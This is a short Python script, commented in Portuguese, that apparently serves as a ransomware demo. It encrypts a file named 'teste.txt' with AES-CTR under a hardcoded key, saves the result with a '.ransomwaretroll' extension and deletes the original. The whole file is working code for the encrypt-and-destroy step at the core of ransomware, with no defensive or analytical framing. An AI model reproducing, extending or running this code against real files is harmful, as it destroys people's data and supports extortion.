import os
import pyaes

# Função para criptografar o arquivo
def encrypt_file(file_name, encryption_key):
    # Verifica se o arquivo existe
    if not os.path.exists(file_name):
        raise FileNotFoundError(f"O arquivo {file_name} não foi encontrado.")
    
    # Tamanho da chave de criptografia para AES deve ser 16, 24 ou 32 bytes
    if len(encryption_key) not in [16, 24, 32]:
        raise ValueError("A chave de criptografia deve ter 16, 24 ou 32 bytes.")
    
    # Lê o arquivo original
    with open(file_name, 'rb') as file:
        file_data = file.read()

    # Criptografa os dados usando AES em modo CTR
    aes = pyaes.AESModeOfOperationCTR(encryption_key)
    encrypted_data = aes.encrypt(file_data)

    # Nome do arquivo criptografado
    encrypted_file_name = f"{file_name}.ransomwaretroll"

    # Salva o arquivo criptografado
    with open(encrypted_file_name, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)

    print(f"Arquivo criptografado com sucesso: {encrypted_file_name}")
    
    # Após a criptografia, podemos remover o arquivo original, se necessário
    os.remove(file_name)
    print(f"Arquivo original {file_name} removido.")

# Configurações iniciais
file_name = "teste.txt"
key = b"8A0j$Tax^Vp4x%UJn@X2@fV#"  # A chave de criptografia precisa ser de 16, 24 ou 32 bytes

try:
    encrypt_file(file_name, key)
except Exception as e:
    print(f"Erro durante a criptografia: {e}")
